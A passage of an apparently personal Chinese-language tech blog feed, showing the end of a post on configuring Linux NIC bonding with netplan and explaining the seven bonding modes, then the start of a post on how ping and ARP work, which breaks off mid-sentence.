ethernets:</span></span><br><span class="line"><span class="attr">          ens33:</span></span><br><span class="line"><span class="attr">                  dhcp4:</span> <span class="literal">no</span></span><br><span class="line"><span class="attr">          ens38:</span></span><br><span class="line"><span class="attr">                  dhcp4:</span> <span class="literal">no</span></span><br><span class="line"></span><br><span class="line"><span class="attr">  bonds:</span></span><br><span class="line">      <span class="comment"># bond&#x540D;&#x79F0;</span></span><br><span class="line"><span class="attr">      bond-stat:</span></span><br><span class="line"><span class="attr">              interfaces:</span> <span class="string">[ens33,</span> <span class="string">ens38]</span>        <span class="comment"># &#x6DFB;&#x52A0;&#x7684;2&#x5757;&#x7269;&#x7406;&#x7F51;&#x5361;</span></span><br><span class="line"><span class="attr">              addresses:</span> <span class="string">[192.168.73.20/24]</span>     <span class="comment"># &#x5730;&#x5740;</span></span><br><span class="line"><span class="attr">              gateway4:</span> <span class="number">192.168</span><span class="number">.73</span><span class="number">.2</span>        <span class="comment"># &#x7F51;&#x5173;</span></span><br><span class="line"><span class="attr">              nameservers:</span>      <span class="comment"># DNS&#x670D;&#x52A1;&#x5668;</span></span><br><span class="line"><span class="attr">                addresses:</span> <span class="string">[114.114.114.114,</span> <span class="number">192.168</span><span class="number">.73</span><span class="number">.2</span><span class="string">]</span></span><br><span class="line"><span class="attr">              routes:</span>   <span class="comment"># &#x8DEF;&#x7531;</span></span><br><span class="line"><span class="attr">                      - to:</span> <span class="string">default</span></span><br><span class="line"><span class="attr">                        via:</span> <span class="number">192.168</span><span class="number">.73</span><span class="number">.2</span></span><br><span class="line"><span class="attr">              parameters:</span>   </span><br><span class="line"><span class="attr">                      mode:</span> <span class="string">active-backup</span>       <span class="comment"># &#x7ED1;&#x5B9A;&#x6A21;&#x5F0F;</span></span><br><span class="line"><span class="attr">                      mii-monitor-interval:</span> <span class="number">1</span>       <span class="comment"># MII&#x76D1;&#x63A7;&#x65F6;&#x95F4;&#x95F4;&#x9694;</span></span><br></pre></td></tr></tbody></table></figure><p></p></blockquote><p>&#x5E94;&#x7528;&#x914D;&#x7F6E;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo netplan apply</span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="bonding&#x7684;7&#x79CD;&#x6A21;&#x5F0F;&#xFF1A;"><a href="#bonding&#x7684;7&#x79CD;&#x6A21;&#x5F0F;&#xFF1A;" class="headerlink" title="bonding&#x7684;7&#x79CD;&#x6A21;&#x5F0F;&#xFF1A;"></a><strong>bonding&#x7684;7&#x79CD;&#x6A21;&#x5F0F;&#xFF1A;</strong></h4><ul><li><strong>0&#xFF0C;(balance-rr)Round-robin-policy&#xFF0C;&#x5E73;&#x8861;&#x8F6E;&#x8BE2;&#x7B56;&#x7565;</strong>&#xFF0C;<br>&#x7279;&#x70B9;&#xFF1A;&#x4F20;&#x8F93;&#x6570;&#x636E;&#x5305;&#x987A;&#x5E8F;&#x662F;&#x4F9D;&#x6B21;&#x4F20;&#x8F93;&#xFF08;&#x5373;&#xFF1A;&#x7B2C;1&#x4E2A;&#x5305;&#x8D70;eth0&#xFF0C;&#x4E0B;&#x4E00;&#x4E2A;&#x5305;&#x5C31;&#x8D70;eth1&#x2026;.&#x4E00;&#x76F4;&#x5FAA;&#x73AF;&#x4E0B;&#x53BB;&#xFF0C;&#x76F4;&#x5230;&#x6700;&#x540E;&#x4E00;&#x4E2A;&#x4F20;&#x8F93;&#x5B8C;&#x6BD5;&#xFF09;&#xFF0C;&#x6B64;&#x6A21;&#x5F0F;&#x63D0;&#x4F9B;&#x8D1F;&#x8F7D;&#x5E73;&#x8861;&#x548C;&#x5BB9;&#x9519;&#x80FD;&#x529B;&#xFF1B;&#x4F46;&#x662F;&#x6211;&#x4EEC;&#x77E5;&#x9053;&#x5982;&#x679C;&#x4E00;&#x4E2A;&#x8FDE;&#x63A5;&#x6216;&#x8005;&#x4F1A;&#x8BDD;&#x7684;&#x6570;&#x636E;&#x5305;&#x4ECE;&#x4E0D;&#x540C;&#x7684;&#x63A5;&#x53E3;&#x53D1;&#x51FA;&#x7684;&#x8BDD;&#xFF0C;&#x4E2D;&#x9014;&#x518D;&#x7ECF;&#x8FC7;&#x4E0D;&#x540C;&#x7684;&#x94FE;&#x8DEF;&#xFF0C;&#x5728;&#x5BA2;&#x6237;&#x7AEF;&#x5F88;&#x6709;&#x53EF;&#x80FD;&#x4F1A;&#x51FA;&#x73B0;&#x6570;&#x636E;&#x5305;&#x65E0;&#x5E8F;&#x5230;&#x8FBE;&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x800C;&#x65E0;&#x5E8F;&#x5230;&#x8FBE;&#x7684;&#x6570;&#x636E;&#x5305;&#x9700;&#x8981;&#x91CD;&#x65B0;&#x8981;&#x6C42;&#x88AB;&#x53D1;&#x9001;&#xFF0C;&#x8FD9;&#x6837;&#x7F51;&#x7EDC;&#x7684;&#x541E;&#x5410;&#x91CF;&#x5C31;&#x4F1A;&#x4E0B;&#x964D;<ul><li><strong>1&#xFF0C;(active-backup)Active-backup policy&#xFF0C;&#x4E3B;-&#x5907;&#x4EFD;&#x7B56;&#x7565;&#xFF0C;</strong><br>&#x7279;&#x70B9;&#xFF1A;&#x53EA;&#x6709;&#x4E00;&#x4E2A;&#x8BBE;&#x5907;&#x5904;&#x4E8E;&#x6D3B;&#x52A8;&#x72B6;&#x6001;&#xFF0C;&#x5F53;&#x4E00;&#x4E2A;&#x5B95;&#x6389;&#x53E6;&#x4E00;&#x4E2A;&#x9A6C;&#x4E0A;&#x7531;&#x5907;&#x4EFD;&#x8F6C;&#x6362;&#x4E3A;&#x4E3B;&#x8BBE;&#x5907;&#x3002;mac&#x5730;&#x5740;&#x662F;&#x5916;&#x90E8;&#x53EF;&#x89C1;&#x5F97;&#xFF0C;&#x4ECE;&#x5916;&#x9762;&#x770B;&#x6765;&#xFF0C;bond&#x7684;MAC&#x5730;&#x5740;&#x662F;&#x552F;&#x4E00;&#x7684;&#xFF0C;&#x4EE5;&#x907F;&#x514D;switch(&#x4EA4;&#x6362;&#x673A;)&#x53D1;&#x751F;&#x6DF7;&#x4E71;&#x3002;&#x6B64;&#x6A21;&#x5F0F;&#x53EA;&#x63D0;&#x4F9B;&#x4E86;&#x5BB9;&#x9519;&#x80FD;&#x529B;&#xFF1B;&#x7531;&#x6B64;&#x53EF;&#x89C1;&#x6B64;&#x7B97;&#x6CD5;&#x7684;&#x4F18;&#x70B9;&#x662F;&#x53EF;&#x4EE5;&#x63D0;&#x4F9B;&#x9AD8;&#x7F51;&#x7EDC;&#x8FDE;&#x63A5;&#x7684;&#x53EF;&#x7528;&#x6027;&#xFF0C;&#x4F46;&#x662F;&#x5B83;&#x7684;&#x8D44;&#x6E90;&#x5229;&#x7528;&#x7387;&#x8F83;&#x4F4E;&#xFF0C;&#x53EA;&#x6709;&#x4E00;&#x4E2A;&#x63A5;&#x53E3;&#x5904;&#x4E8E;&#x5DE5;&#x4F5C;&#x72B6;&#x6001;&#xFF0C;&#x5728;&#x6709; N &#x4E2A;&#x7F51;&#x7EDC;&#x63A5;&#x53E3;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x8D44;&#x6E90;&#x5229;&#x7528;&#x7387;&#x4E3A;1/N</li><li><strong>2&#xFF0C;(balance-xor)XOR policy&#xFF0C;&#x5E73;&#x8861;&#x7B56;&#x7565;</strong>&#xFF0C;&#x57FA;&#x4E8E;&#x6307;&#x5B9A;&#x7684;&#x4F20;&#x8F93;HASH&#x7B56;&#x7565;&#x4F20;&#x8F93;&#x6570;&#x636E;&#x5305;&#x3002;&#x7F3A;&#x7701;&#x7684;&#x7B56;&#x7565;&#x662F;(&#x6E90;MAC&#x5730;&#x5740; XOR &#x76EE;&#x6807;MAC&#x5730;&#x5740;)%slave&#x6570;&#x91CF;&#xFF0C;&#x5176;&#x4ED6;&#x7684;&#x4F20;&#x8F93;&#x7B56;&#x7565;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;xmit_hash_policy&#x9009;&#x9879;&#x6307;&#x5B9A;&#xFF0C;&#x6B64;&#x6A21;&#x5F0F;&#x63D0;&#x4F9B;&#x8D1F;&#x8F7D;&#x5E73;&#x8861;&#x548C;&#x5BB9;&#x9519;&#x80FD;&#x529B;&#xFF09;</li><li><strong>3&#xFF0C;broadcast&#x5E7F;&#x64AD;&#x7B56;&#x7565;</strong>&#xFF0C;&#x5728;&#x6BCF;&#x4E2A;slave&#x63A5;&#x53E3;&#x4E0A;&#x4F20;&#x8F93;&#x6BCF;&#x4E2A;&#x6570;&#x636E;&#x5305;&#xFF0C;&#x6B64;&#x6A21;&#x5F0F;&#x63D0;&#x4F9B;&#x4E86;&#x5BB9;&#x9519;&#x80FD;&#x529B;</li><li><strong>4&#xFF0C;(802.3ad)IEEE 802.3ad Dynamic link aggregation&#xFF08;IEEE 802.3ad&#x52A8;&#x6001;&#x94FE;&#x8DEF;&#x805A;&#x5408;&#xFF09;</strong>&#xFF0C;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x805A;&#x5408;&#x7EC4;&#xFF0C;&#x5B83;&#x4EEC;&#x5171;&#x4EAB;&#x540C;&#x6837;&#x7684;&#x7684;&#x901F;&#x7387;&#x548C;&#x53CC;&#x5DE5;&#x8BBE;&#x5B9A;&#x3002;&#x6839;&#x636E;802.3ad&#x89C4;&#x8303;&#x5C06;&#x591A;&#x4E2A;slave&#x5DE5;&#x4F5C;&#x548B;&#x540C;&#x4E00;&#x4E2A;&#x6FC0;&#x6D3B;&#x7684;&#x805A;&#x5408;&#x4F53;&#x4E0B;&#xFF0C;&#x5916;&#x51FA;&#x6D41;&#x91CF;&#x7684;slave&#x9009;&#x4E3E;&#x662F;&#x57FA;&#x4E8E;&#x4F20;&#x8F93;hash&#x7B56;&#x7565;&#xFF0C;&#x8BE5;&#x7B56;&#x7565;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;xmit_hash_policy&#x9009;&#x7EBF;&#x4ECE;&#x7F3A;&#x7701;&#x7684;XOR&#x7B56;&#x7565;&#x6539;&#x53D8;&#x5230;&#x5176;&#x4ED6;&#x7B56;&#x7565;&#xFF0C;&#x9700;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x662F;&#xFF0C;&#x5E76;&#x4E0D;&#x662F;&#x6240;&#x6709;&#x7684;&#x9664;&#x6570;&#x7B56;&#x7565;&#x90FD;&#x662F;802.3ad&#x9002;&#x5E94;&#x7684;&#xFF0C;&#x5C24;&#x5176;&#x8003;&#x8651;&#x5230;&#x5728;802.3ad&#x6807;&#x51C6;&#x7684;43.2.4&#x7AE0;&#x8282;&#x63D0;&#x53CA;&#x7684;&#x5305;&#x4E71;&#x5E8F;&#x95EE;&#x9898;&#x3002;&#x4E0D;&#x540C;&#x7684;&#x662F;&#x5B9E;&#x73B0;&#x53EF;&#x80FD;&#x4F1A;&#x6709;&#x4E0D;&#x540C;&#x7684;&#x9002;&#x5E94;&#x6027;&#x3002;<ul><li>&#x5FC5;&#x987B;&#x8981;&#x6761;&#x4EF6;&#xFF1A;<ul><li>&#x6761;&#x4EF6;1&#xFF1A;ethtool&#x652F;&#x6301;&#x83B7;&#x53D6;&#x6BCF;&#x4E2A;slave&#x7684;&#x901F;&#x7387;&#x548C;&#x53CC;&#x5DE5;&#x8BBE;&#x5B9A;</li><li>&#x6761;&#x4EF6;2&#xFF1A;switch&#x4EA4;&#x6362;&#x673A;&#x652F;&#x6301;IEEE 802.3ad Dynamic link aggregation</li><li>&#x6761;&#x4EF6;3&#xFF1A;&#x5927;&#x591A;&#x6570;switch&#x9700;&#x8981;&#x7ECF;&#x8FC7;&#x7279;&#x5B9A;&#x914D;&#x7F6E;&#x624D;&#x80FD;&#x652F;&#x6301;802.3ad&#x6A21;&#x5F0F;</li></ul></li></ul></li><li><strong>5&#xFF0C;(balance-tlb)Adaptive transmit load balancing&#x9002;&#x914D;&#x5668;&#x4F20;&#x8F93;&#x8D1F;&#x8F7D;&#x5747;&#x8861;</strong>&#xFF0C;&#x4E0D;&#x9700;&#x8981;&#x4EFB;&#x4F55;&#x7279;&#x522B;&#x7684;switch&#x652F;&#x6301;&#x7684;&#x901A;&#x9053;bonding&#xFF0C;&#x5728;&#x6BCF;&#x4E2A;slave&#x4E0A;&#x6839;&#x636E;&#x5F53;&#x524D;&#x7684;&#x8D1F;&#x8F7D;&#xFF08;&#x6839;&#x636E;&#x901F;&#x5EA6;&#x8BA1;&#x7B97;&#xFF09;&#x5206;&#x914D;&#x5916;&#x51FA;&#x6D41;&#x91CF;&#xFF0C;&#x5982;&#x679C;&#x6B63;&#x5728;&#x63A5;&#x53D7;&#x6570;&#x636E;&#x7684;slave&#x51FA;&#x6545;&#x969C;&#x4E86;&#xFF0C;&#x53E6;&#x4E00;&#x4E2A;slave&#x63A5;&#x7BA1;&#x5931;&#x8D25;&#x7684;slave&#x7684;MAC&#x5730;&#x5740;<ul><li>&#x8BE5;&#x6A21;&#x5F0F;&#x7684;&#x5FC5;&#x8981;&#x6761;&#x4EF6;&#xFF1A;ethtool&#x652F;&#x6301;&#x83B7;&#x53D6;&#x6BCF;&#x4E2A;slave&#x7684;&#x901F;&#x7387;</li></ul></li><li><strong>6&#xFF0C;(balance-alb)Adaptive load balancing&#x9002;&#x914D;&#x5668;&#x9002;&#x5E94;&#x6027;&#x8D1F;&#x8F7D;&#x5747;&#x8861;</strong>&#xFF0C;&#x8BE5;&#x6A21;&#x5F0F;&#x5305;&#x542B;&#x4E86;balance=tlb&#x6A21;&#x5F0F;&#xFF0C;&#x540C;&#x65F6;&#x52A0;&#x4E0A;&#x9488;&#x5BF9;IPv4&#x6D41;&#x91CF;&#x7684;&#x63A5;&#x6536;&#x8D1F;&#x8F7D;&#x5747;&#x8861;&#xFF08;receiveload balance&#xFF0C;rlb&#xFF09;&#xFF0C;&#x800C;&#x4E14;&#x4E0D;&#x9700;&#x8981;&#x4EFB;&#x4F55;switch&#x7684;&#x652F;&#x6301;&#xFF0C;&#x63A5;&#x6536;&#x8D1F;&#x8F7D;&#x5747;&#x8861;&#x662F;&#x901A;&#x8FC7;ARP&#x534F;&#x5546;&#x5B9E;&#x73B0;&#x7684;&#xFF0C;bonding&#x9A71;&#x52A8;&#x622A;&#x83B7;&#x672C;&#x673A;&#x7684;ARP&#x5E94;&#x7B54;&#xFF0C;&#x5E76;&#x628A;&#x6E90;&#x786C;&#x4EF6;&#x5730;&#x5740;&#x6539;&#x5199;&#x4E3A;bood&#x4E2D;&#x67D0;&#x4E2A;salve&#x7684;&#x552F;&#x4E00;&#x786C;&#x4EF6;&#x5730;&#x5740;&#xFF0C;&#x4ECE;&#x800C;&#x4F7F;&#x5F97;&#x4E0D;&#x540C;&#x7684;&#x5BF9;&#x7AEF;&#x4F7F;&#x7528;&#x4E0D;&#x540C;&#x7684;&#x786C;&#x4EF6;&#x5730;&#x5740;&#x8FDB;&#x884C;&#x901A;&#x4FE1;&#x3002;<br>&#x6765;&#x81EA;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x7684;&#x63A5;&#x6536;&#x6D41;&#x91CF;&#x4E5F;&#x4F1A;&#x88AB;&#x5747;&#x8861;&#x3002;&#x5F53;&#x672C;&#x673A;&#x53D1;&#x9001;ARP&#x8BF7;&#x6C42;&#x65F6;&#xFF0C;bonding&#x9A71;&#x52A8;&#x628A;&#x5BF9;&#x7AEF;&#x7684;IP&#x4FE1;&#x606F;&#x4ECE;ARP&#x5305;&#x4E2D;&#x590D;&#x5236;&#x5E76;&#x4FDD;&#x5B58;&#x4E0B;&#x6765;&#x3002;&#x5F53;ARP&#x5E94;&#x7B54;&#x4ECE;&#x5BF9;&#x7AEF;&#x5230;&#x8FBE;&#x65F6;&#xFF0C;bonding&#x9A71;&#x52A8;&#x628A;&#x5B83;&#x7684;&#x786C;&#x4EF6;&#x5730;&#x5740;&#x63D0;&#x53D6;&#x51FA;&#x6765;&#xFF0C;&#x5E76;&#x53D1;&#x8D77;&#x4E00;&#x4E2A;ARP&#x5E94;&#x7B54;&#x7ED9;bond&#x4E2D;&#x7684;&#x67D0;&#x4E2A;slave&#x3002;&#x4F7F;&#x7528;ARP&#x534F;&#x5546;&#x8FDB;&#x884C;&#x8D1F;&#x8F7D;&#x5747;&#x8861;&#x7684;&#x4E00;&#x4E2A;&#x95EE;&#x9898;&#x662F;&#xFF1A;&#x6BCF;&#x6B21;&#x5E7F;&#x64AD; ARP&#x8BF7;&#x6C42;&#x65F6;&#x90FD;&#x4F1A;&#x4F7F;&#x7528;bond&#x7684;&#x786C;&#x4EF6;&#x5730;&#x5740;&#xFF0C;&#x56E0;&#x6B64;&#x5BF9;&#x7AEF;&#x5B66;&#x4E60;&#x5230;&#x8FD9;&#x4E2A;&#x786C;&#x4EF6;&#x5730;&#x5740;&#x540E;&#xFF0C;&#x63A5;&#x6536;&#x6D41;&#x91CF;&#x5C06;&#x4F1A;&#x5168;&#x90E8;&#x6D41;&#x5411;&#x5F53;&#x524D;&#x7684;slave&#x3002;&#x8FD9;&#x4E2A;&#x95EE;&#x9898;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x7ED9;&#x6240;&#x6709;&#x7684;&#x5BF9;&#x7AEF;&#x53D1;&#x9001;&#x66F4;&#x65B0;&#xFF08;ARP&#x5E94;&#x7B54;&#xFF09;&#x6765;&#x89E3;&#x51B3;&#xFF0C;&#x5E94;&#x7B54;&#x4E2D;&#x5305;&#x542B;&#x4ED6;&#x4EEC;&#x72EC;&#x4E00;&#x65E0;&#x4E8C;&#x7684;&#x786C;&#x4EF6;&#x5730;&#x5740;&#xFF0C;&#x4ECE;&#x800C;&#x5BFC;&#x81F4;&#x6D41;&#x91CF;&#x91CD;&#x65B0;&#x5206;&#x5E03;&#x3002;&#x5F53;&#x65B0;&#x7684;slave&#x52A0;&#x5165;&#x5230;bond&#x4E2D;&#x65F6;&#xFF0C;&#x6216;&#x8005;&#x67D0;&#x4E2A;&#x672A;&#x6FC0;&#x6D3B;&#x7684;slave&#x91CD;&#x65B0; &#x6FC0;&#x6D3B;&#x65F6;&#xFF0C;&#x63A5;&#x6536;&#x6D41;&#x91CF;&#x4E5F;&#x8981;&#x91CD;&#x65B0;&#x5206;&#x5E03;&#x3002;&#x63A5;&#x6536;&#x7684;&#x8D1F;&#x8F7D;&#x88AB;&#x987A;&#x5E8F;&#x5730;&#x5206;&#x5E03;&#xFF08;roundrobin&#xFF09;&#x5728;bond&#x4E2D;&#x6700;&#x9AD8;&#x901F;&#x7684;slave&#x4E0A;&#x5F53;&#x67D0;&#x4E2A;&#x94FE;&#x8DEF;&#x88AB;&#x91CD;&#x65B0;&#x63A5;&#x4E0A;&#xFF0C;&#x6216;&#x8005;&#x4E00;&#x4E2A;&#x65B0;&#x7684;slave&#x52A0;&#x5165;&#x5230;bond&#x4E2D;&#xFF0C;&#x63A5;&#x6536;&#x6D41;&#x91CF;&#x5728;&#x6240;&#x6709;&#x5F53;&#x524D;&#x6FC0;&#x6D3B;&#x7684;slave&#x4E2D;&#x5168;&#x90E8;&#x91CD;&#x65B0;&#x5206;&#x914D;&#xFF0C;&#x901A;&#x8FC7;&#x4F7F;&#x7528;&#x6307;&#x5B9A;&#x7684;MAC&#x5730;&#x5740;&#x7ED9;&#x6BCF;&#x4E2A; client&#x53D1;&#x8D77;ARP&#x5E94;&#x7B54;&#x3002;&#x4E0B;&#x9762;&#x4ECB;&#x7ECD;&#x7684;updelay&#x53C2;&#x6570;&#x5FC5;&#x987B;&#x88AB;&#x8BBE;&#x7F6E;&#x4E3A;&#x67D0;&#x4E2A;&#x5927;&#x4E8E;&#x7B49;&#x4E8E;switch(&#x4EA4;&#x6362;&#x673A;)&#x8F6C;&#x53D1;&#x5EF6;&#x65F6;&#x7684;&#x503C;&#xFF0C;&#x4ECE;&#x800C;&#x4FDD;&#x8BC1;&#x53D1;&#x5F80;&#x5BF9;&#x7AEF;&#x7684;ARP&#x5E94;&#x7B54; &#x4E0D;&#x4F1A;&#x88AB;switch(&#x4EA4;&#x6362;&#x673A;)&#x963B;&#x622A;&#x3002;<br>&#x5FC5;&#x8981;&#x6761;&#x4EF6;&#xFF1A;&#x6761;&#x4EF6;1&#xFF1A;ethtool&#x652F;&#x6301;&#x83B7;&#x53D6;&#x6BCF;&#x4E2A;slave&#x7684;&#x901F;&#x7387;&#xFF1B;&#x6761;&#x4EF6;2&#xFF1A;&#x5E95;&#x5C42;&#x9A71;&#x52A8;&#x652F;&#x6301;&#x8BBE;&#x7F6E;&#x67D0;&#x4E2A;&#x8BBE;&#x5907;&#x7684;&#x786C;&#x4EF6;&#x5730;&#x5740;&#xFF0C;&#x4ECE;&#x800C;&#x4F7F;&#x5F97;&#x603B;&#x662F;&#x6709;&#x4E2A;slave(curr_active_slave)&#x4F7F;&#x7528;bond&#x7684;&#x786C;&#x4EF6;&#x5730;&#x5740;&#xFF0C;&#x540C;&#x65F6;&#x4FDD;&#x8BC1;&#x6BCF;&#x4E2A; bond &#x4E2D;&#x7684;slave&#x90FD;&#x6709;&#x4E00;&#x4E2A;&#x552F;&#x4E00;&#x7684;&#x786C;&#x4EF6;&#x5730;&#x5740;&#x3002;&#x5982;&#x679C;curr_active_slave&#x51FA;&#x6545;&#x969C;&#xFF0C;&#x5B83;&#x7684;&#x786C;&#x4EF6;&#x5730;&#x5740;&#x5C06;&#x4F1A;&#x88AB;&#x65B0;&#x9009;&#x51FA;&#x6765;&#x7684; curr_active_slave&#x63A5;&#x7BA1;&#x5176;&#x5B9E;mod=6&#x4E0E;mod=0&#x7684;&#x533A;&#x522B;&#xFF1A;mod=6&#xFF0C;&#x5148;&#x628A;eth0&#x6D41;&#x91CF;&#x5360;&#x6EE1;&#xFF0C;&#x518D;&#x5360;eth1&#xFF0C;&#x2026;.ethX&#xFF1B;&#x800C;mod=0&#x7684;&#x8BDD;&#xFF0C;&#x4F1A;&#x53D1;&#x73B0;2&#x4E2A;&#x53E3;&#x7684;&#x6D41;&#x91CF;&#x90FD;&#x5F88;&#x7A33;&#x5B9A;&#xFF0C;&#x57FA;&#x672C;&#x4E00;&#x6837;&#x7684;&#x5E26;&#x5BBD;&#x3002;&#x800C;mod=6&#xFF0C;&#x4F1A;&#x53D1;&#x73B0;&#x7B2C;&#x4E00;&#x4E2A;&#x53E3;&#x6D41;&#x91CF;&#x5F88;&#x9AD8;&#xFF0C;&#x7B2C;2&#x4E2A;&#x53E3;&#x53EA;&#x5360;&#x4E86;&#x5C0F;&#x90E8;&#x5206;&#x6D41;&#x91CF;</li></ul></li></ul><hr><p>&#x53C2;&#x8003;&#x94FE;&#x63A5;&#xFF1A;<br><a href="https://www.jianshu.com/p/793b0138a3ef" target="_blank" rel="noopener">https://www.jianshu.com/p/793b0138a3ef</a><br><a href="https://chegva.com/2506.html" target="_blank" rel="noopener">https://chegva.com/2506.html</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Linux&amp;#x7F51;&amp;#x5361;&amp;#x805A;&amp;#x5408;&amp;#x914D;&amp;#x7F6E;&quot;&gt;&lt;a href=&quot;#Linux&amp;#x7F51;&amp;#x5361;&amp;#x805A;&amp;#x5408;&amp;#x914D;&amp;#x7F6E;&quot; class=&quot;heade
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Linux禁止和开启ping的方法</title>
    <link href="https://marnm.github.io//posts/be846aea/"/>
    <id>https://marnm.github.io//posts/be846aea/</id>
    <published>2022-06-07T04:40:03.000Z</published>
    <updated>2022-06-07T05:20:49.584Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ping-&#x539F;&#x7406;"><a href="#ping-&#x539F;&#x7406;" class="headerlink" title="ping &#x539F;&#x7406;"></a>ping &#x539F;&#x7406;</h2><p>&#x7F51;&#x7EDC;&#x4E0A;&#x7684;&#x673A;&#x5668;&#x90FD;&#x6709;&#x552F;&#x4E00;&#x786E;&#x5B9A;&#x7684;IP&#x5730;&#x5740;&#xFF0C;&#x6211;&#x4EEC;&#x7ED9;&#x76EE;&#x6807;IP&#x5730;&#x5740;&#x53D1;&#x9001;&#x4E00;&#x4E2A;&#x6570;&#x636E;&#x5305;&#xFF0C;&#x5BF9;&#x65B9;&#x5C31;&#x8981;&#x8FD4;&#x56DE;&#x4E00;&#x4E2A;&#x540C;&#x6837;&#x5927;&#x5C0F;&#x7684;&#x6570;&#x636E;&#x5305;&#xFF0C;&#x6839;&#x636E;&#x8FD4;&#x56DE;&#x7684;&#x6570;&#x636E;&#x5305;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x786E;&#x5B9A;&#x76EE;&#x6807;&#x4E3B;&#x673A;&#x7684;&#x5B58;&#x5728;&#xFF0C;&#x53EF;&#x4EE5;&#x521D;&#x6B65;&#x5224;&#x65AD;&#x76EE;&#x6807;&#x4E3B;&#x673A;&#x7684;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x7B49;&#x3002;</p><p>ping&#x547D;&#x4EE4;&#x4E00;&#x822C;&#x7528;&#x4E8E;&#x68C0;&#x6D4B;&#x7F51;&#x7EDC;&#x901A;&#x4E0E;&#x4E0D;&#x901A;&#xFF0C;&#x4E5F;&#x53EB;&#x65F6;&#x5EF6;&#xFF08;&#x7F51;&#x7EDC;&#x4E00;&#x7AEF;&#x4F20;&#x9001;&#x5230;&#x53E6;&#x4E00;&#x7AEF;&#x9700;&#x8981;&#x7684;&#x65F6;&#x95F4;&#xFF09;&#xFF0C;&#x5176;&#x503C;&#x8D8A;&#x5927;&#xFF0C;&#x901F;&#x5EA6;&#x8D8A;&#x6162; ping (Packet Internet Grope)&#xFF0C;&#x56E0;&#x7279;&#x7F51;&#x5305;&#x63A2;&#x7D22;&#x5668;&#xFF0C;&#x7528;&#x4E8E;&#x6D4B;&#x8BD5;&#x7F51;&#x7EDC;&#x8FDE;&#x63A5;&#x91CF;&#x7684;&#x7A0B;&#x5E8F;&#x3002;</p><p>ping&#x53D1;&#x9001;&#x4E00;&#x4E2A;ICMP&#x56DE;&#x58F0;&#x8BF7;&#x6C42;&#x6D88;&#x606F;&#x7ED9;&#x76EE;&#x7684;&#x5730;&#x5E76;&#x62A5;&#x544A;&#x662F;&#x5426;&#x6536;&#x5230;&#x6240;&#x5E0C;&#x671B;&#x7684;ICMP&#x56DE;&#x58F0;&#x5E94;&#x7B54;&#x3002;&#x5B83;&#x662F;&#x7528;&#x6765;&#x68C0;&#x67E5;&#x7F51;&#x7EDC;&#x662F;&#x5426;&#x901A;&#x7545;&#x6216;&#x8005;&#x7F51;&#x7EDC;&#x8FDE;&#x63A5;&#x901F;&#x5EA6;&#x7684;&#x547D;&#x4EE4;&#x3002;</p><h2 id="ping&#x7684;&#x5DE5;&#x4F5C;&#x6D41;&#x7A0B;"><a href="#ping&#x7684;&#x5DE5;&#x4F5C;&#x6D41;&#x7A0B;" class="headerlink" title="ping&#x7684;&#x5DE5;&#x4F5C;&#x6D41;&#x7A0B;"></a>ping&#x7684;&#x5DE5;&#x4F5C;&#x6D41;&#x7A0B;</h2><p>1&#x3001;&#x5728;&#x540C;&#x4E00;&#x7F51;&#x6BB5;&#x5185;</p><pre><code>ping</code></pre><p>&#x4E3B;&#x673A;A&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&gt;&#x4E3B;&#x673A;B<br>ICMP&#x8BF7;&#x6C42;&#x5305;  </p><ul><li>&#x5728;&#x672C;&#x673A;(&#x4E3B;&#x673A;A)&#x67E5;&#x627E;ARP&#x7F13;&#x5B58;&#x8868;&#x67E5;&#x627E;&#x4E3B;&#x673A;B&#x7684;IP&#x4E0E;&#x5176;&#x5BF9;&#x5E94;&#x7684;MAC</li><li>&#x6CA1;&#x6709;&#x627E;&#x5230;&#x4E3B;&#x673A;B&#x7684;IP&#x4E0E;&#x5176;MAC&#x7684;&#x6620;&#x5C04;&#x5173;&#x7CFB;&#xFF0C;&#x5219;&#x53D1;&#x9001;&#x4E00;&#x4E2A;arp (&#x6839;&#x636E;IP&#x5730;&#x5740;&#x83B7;&#x53D6;&#x7269;&#x7406;&#x5730;&#x5740;&#x7684;&#x4E00;&#x4E2A;TCP/IP&#x534F;&#x8BAE;) &#x8BF7;&#x6C42;&#x5E7F;&#x64AD;</li><li>&#x4E3B;&#x673A;B&#x63A5;&#x6536;&#x5230;arp&#x8BF7;&#x6C42;&#x5305;&#x540E;&#xFF0C;&#x56DE;&#x590D;&#x4E00;&#x4E2A;arp&#x5E94;&#x7B54;&#x5305;(&#x91CC;&#x9762;&#x5305;&#x542B;&#x672C;&#x673A;MAC)</li></ul><p>&#x4E3B;&#x673A;A&lt;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;-&#x4E3B;&#x673A;B<br>ICMP&#x5E94;&#x7B54;&#x5305;</p><p>2&#x3001;&#x4E0D;&#x5728;&#x540C;&#x4E00;&#x7F51;&#x6BB5;</p><p>&#x5728;&#x4E3B;&#x673A;A&#x4E0A;&#x8FD0;&#x884C;&#x201C;ping&#x4E3B;&#x673A;C(&#x4E0D;&#x5728;&#x540C;&#x4E00;&#x7F51;&#x6BB5;)&#x201D;&#x540E;&#xFF0C;&#x5F00;&#x59CB;&#x8DDF;&#x4E0A;&#x9762;&#x4E00;&#x6837;&#xFF0C;